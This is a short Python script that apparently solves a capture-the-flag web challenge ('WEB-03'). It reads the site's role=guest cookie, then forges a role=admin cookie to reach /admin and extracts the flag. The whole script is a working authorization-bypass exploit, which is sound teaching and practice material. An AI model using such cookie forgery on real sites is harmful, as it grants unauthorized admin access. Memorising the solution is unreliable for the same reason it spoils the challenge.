#!/usr/bin/env python3
"""WEB-03 Cookie admin: / sets role=guest; send role=admin to /admin."""
import re

import requests

import _util as u


def main():
    a = u.args(__doc__, default_via="web")
    s = requests.Session()
    s.get(u.url(a, "/"), timeout=10)
    print("cookies from /:", s.cookies.get_dict())
    r = s.get(u.url(a, "/admin"), timeout=10)
    print(f"/admin as guest: HTTP {r.status_code}")
    r = requests.get(u.url(a, "/admin"), cookies={"role": "admin"}, timeout=10)
    m = u.FLAG_RE.search(r.text)
    u.finish("WEB-03", m.group(0) if m else None, a)


main()
